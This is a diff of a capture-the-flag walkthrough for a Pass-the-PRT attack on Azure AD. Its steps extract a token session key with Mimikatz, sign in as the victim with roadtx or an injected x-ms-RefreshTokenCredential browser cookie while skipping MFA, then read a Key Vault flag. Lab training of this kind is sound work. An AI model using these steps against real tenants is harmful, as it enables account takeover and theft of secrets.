@@ -59,37 +59,60 @@ token::elevate
 dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect
 ```
 
-Copy the two output values:
-- **Context**
-- **DerivedKey**
+The output shows **three values** — copy all of them:
+- **Context** — the nonce embedded in the key blob
+- **Clear key** — the raw DPAPI-decrypted session key (used by roadtx)
+- **Derived Key** — `HMAC-SHA256(Clear key, Context)` (used by Mimikatz cookie generation)
 
-### Step 4 — Generate a PRT cookie
+> **Important:** `Clear key` and `Derived Key` are different. roadtx expects the **Clear key**. Passing the Derived Key to roadtx causes authentication to fail (AADSTS500061).
+
+### Step 4 — Authenticate as the victim (roadtx — recommended)
+
+On your attacking machine, use [roadtx](https://github.com/dirkjanm/ROADtools) with the **Clear key**:
+
+```shell
+roadtx prtauth \
+  --prt <PRT> \
+  --prt-sessionkey <Clear_key> \
+  --resource https://vault.azure.net/
+```
+
+Read the flag directly:
+
+```shell
+TOKEN=$(python3 -c "import json; print(json.load(open('.roadtools_auth'))['accessToken'])")
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" \
+  | python3 -m json.tool
+```
+
+### Step 5 — Authenticate as the victim (browser cookie — alternative)
+
+Generate a signed PRT cookie using Mimikatz (uses the **Derived Key**):
 
 ```
 dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>
 ```
 
-The output ends with a line starting `Signature with key:`. Copy the full value that follows — this is your signed PRT cookie.
+The output ends with `Signature with key:` — copy that full value. **Use it immediately** (the nonce expires in ~1 minute).
 
-### Step 5 — Inject the cookie into a browser
+On **any machine**, open Microsoft Edge or Chrome in **private/incognito** mode:
 
-On **any machine** (including your own), open Microsoft Edge or Chrome in private/incognito mode and navigate to:
+1. Navigate to `https://login.microsoftonline.com`
+2. Open Developer Tools (`F12`) → **Application** → **Cookies** → `https://login.microsoftonline.com` → delete all cookies
+3. Add a new cookie:
 
-```
-https://login.microsoftonline.com
-```
+| Field    | Value                             |
+|----------|-----------------------------------|
+| Name     | `x-ms-RefreshTokenCredential`     |
+| Value    | `<paste the signed cookie value>` |
+| Domain   | `login.microsoftonline.com`       |
+| Path     | `/`                               |
+| HttpOnly | ✓                                 |
+| Secure   | ✓                                 |
 
-Open Developer Tools (`F12`) → **Application** tab → **Cookies** → `login.microsoftonline.com` → clear all existing cookies.
-
-Double-click an empty row and add:
-
-| Field     | Value                              |
-|-----------|------------------------------------|
-| Name      | `x-ms-RefreshTokenCredential`      |
-| Value     | `<paste the signed cookie value>`  |
-| HttpOnly  | ✓ (checked)                        |
-
-Refresh the page. If the cookie persists, navigate again to `https://login.microsoftonline.com` — you will be automatically signed in as the victim user, **with no MFA prompt**.
+4. In the address bar type `https://login.microsoftonline.com` and press Enter (do not just press F5)
+5. Enter the victim's UPN (`ptp-victim-XXXX@yourdomain.onmicrosoft.com`) — Azure AD reads the cookie during the credential phase and signs you in with **no password or MFA prompt**
 
 ### Step 6 — Read the flag from Key Vault
 
@@ -98,10 +121,12 @@ In the Azure portal (authenticated as victim):
 1. Navigate to **Key Vaults** → `<keyvault_name>`
 2. **Secrets** → `flag` → click the version → **Show Secret Value**
 
-Or via the Azure CLI with the access token obtained from the authenticated session:
+Or with PowerShell using the token from roadtx:
 
-```shell
-az keyvault secret show --vault-name <keyvault_name> --name flag --query value -o tsv
+```powershell
+$token = "<access_token>"
+$headers = @{ Authorization = "Bearer $token" }
+(Invoke-RestMethod -Uri "https://<keyvault_name>.vault.azure.net/secrets/flag?api-version=7.4" -Headers $headers).value
 ```
 
 ### Step 7 — Submit the flag
